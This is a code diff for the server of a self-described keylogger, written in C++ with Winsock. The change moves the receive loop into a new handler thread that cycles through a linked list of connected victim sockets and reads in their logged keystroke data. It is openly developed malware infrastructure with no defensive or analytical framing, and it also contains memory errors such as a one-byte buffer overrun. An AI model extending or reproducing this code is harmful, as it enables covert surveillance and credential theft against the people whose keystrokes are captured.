@@ -18,7 +18,6 @@ void Listener()
     slist.nextTarget=0x00;
     slist.target=0x00;
     int cL;
-    char* buffer = (char*)malloc(0x1000);
     fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
     fprintf(stderr ,"\t[*] Initalizing socket...\n");
     if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
@@ -59,7 +58,7 @@ void Listener()
             fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
             u_long mode =1;
             ioctlsocket(acceptedTarget,FIONBIO,&mode);
-            link.target = acceptedTarget;
+            link.target = &acceptedTarget;
 
             mu.lock();
             /*
@@ -79,24 +78,55 @@ void Listener()
                 slist.nextTarget=&link;
             }
             mu.unlock();
-            unsigned int rcv;
-            while(recv(acceptedTarget,buffer,0x1001,0) !=  SOCKET_ERROR || (rcv =WSAGetLastError()) == WSAEWOULDBLOCK)
-            {
-                if (rcv != WSAEWOULDBLOCK)
-                {
-                    *(buffer+0x1000)=0x00;
-                    printf("%s",buffer);
-                }
-                WSASetLastError(0x00);
-                rcv = 0x00;
-            }
-            printf("Error: %d", WSAGetLastError());
-            printf("\n</KeyLoggerMetaData>\n");
+
         }
 
     }
-    closesocket(acceptedTarget);
-    WSACleanup();
+
+}
+void Handler()
+{
+        unsigned int rcv;
+        char* buffer = (char*)malloc(0x1000);
+        SOCKETLIST link;
+        while(1)
+        {
+            while(slist.target == NULL )
+                Sleep(1);
+            link.nextTarget=slist.nextTarget;
+            link.target=slist.target;
+            while(slist.target!=NULL)
+            {
+
+                while(recv(*(link.target),buffer,0x1001,0) !=  SOCKET_ERROR )
+                {
+                        *(buffer+0x1000)=0x00;
+                      //  printf("%s",buffer);
+                }
+                if (WSAGetLastError() == WSAEWOULDBLOCK)
+                {
+                    Sleep(1);
+                    WSASetLastError(0x00);
+
+                    link = *(link.nextTarget);
+                }
+                else
+                {
+                  //  printf("\n</KeyLoggerMetaData>\n");
+                    SOCKETLIST temp = *(link.nextTarget);
+                   if( link.target == temp.target)
+                    {
+                        mu.lock();
+                        slist.target=0x00;
+                        slist.nextTarget=0x00;
+                        mu.unlock();
+                    }
+                    /*
+                        TODO: remove socket from linked list
+                    */
+                }
+            }
+        }
 }
 /**
     this is a temporary server used for testing, future changes will be established
@@ -104,7 +134,7 @@ void Listener()
 int main()
 {
     std::thread thread1 (Listener);
-
+    std::thread thread2 (Handler);
     thread1.join();
 
     return 0;
